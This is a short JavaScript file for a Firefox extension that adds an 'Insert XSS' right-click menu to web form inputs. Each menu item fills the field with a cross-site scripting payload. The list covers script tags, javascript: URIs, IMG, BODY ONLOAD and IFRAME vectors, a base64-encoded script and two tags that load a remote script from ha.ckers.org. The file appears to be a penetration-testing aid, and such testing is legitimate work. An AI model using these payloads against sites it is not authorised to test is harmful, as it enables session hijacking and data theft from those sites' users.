var cm = require("context-menu");
cm.Menu({
  label: "Insert XSS",
  context: cm.SelectorContext("input"),
  contentScript: 'self.on("click", function (node, data) {' +
                 '  console.log("You clicked " + data + " and Node: " + node.value);' +
                 '  node.value = data;' +
                 '});',
  items: [
    cm.Item({ label: "<script>alert(1);</script>", data: "<script>alert(1);</script>" }),
    cm.Item({ label: "\"/><script>alert(1);</script>", data: "\"/><script>alert(1);</script>" }),
    cm.Item({ label: "'';!--\"<XSS>=&{()}", data: "'';!--\"<XSS>=&{()}" }),
    cm.Item({ label: "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", data: "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>" }),
    cm.Item({ label: "\";</script><script>alert(1);</script>", data: "" }),
    cm.Item({ label: "--><script>alert(1);</script>", data: "" }),
    cm.Item({ label: "text';</script><script>alert(1);</script>", data: "text';</script><script>alert(1);</script>" }),
    cm.Item({ label: "<IMG SRC=\"javascript:alert('XSS');\">", data: "<IMG SRC=\"javascript:alert('XSS');\">" }),
    cm.Item({ label: "<IMG SRC=javascript:alert('XSS')>", data: "<IMG SRC=javascript:alert('XSS')>" }),
    cm.Item({ label: "<IMG SRC=JaVaScRiPt:alert('XSS')>", data: "<IMG SRC=JaVaScRiPt:alert('XSS')>" }),
    cm.Item({ label: "<IMG SRC=javascript:alert(&quot;XSS&quot;)>", data: "<IMG SRC=javascript:alert(&quot;XSS&quot;)>" }),
    cm.Item({ label: "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", data: "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" }),
    cm.Item({ label: "<SCRIPT>a=/XSS/", data: "<SCRIPT>a=/XSS/" }),
    cm.Item({ label: "\\\";alert('XSS');//", data: "\\\";alert('XSS');//" }),
    cm.Item({ label: "<BODY ONLOAD=alert('XSS')>", data: "<BODY ONLOAD=alert('XSS')>" }),
    cm.Item({ label: "<BR SIZE=\"&{alert('XSS')}\">", data: "<BR SIZE=\"&{alert('XSS')}\">" }),
    cm.Item({ label: "html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", data: "html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">" }),
    cm.Item({ label: "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", data: "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>" })
  ]
});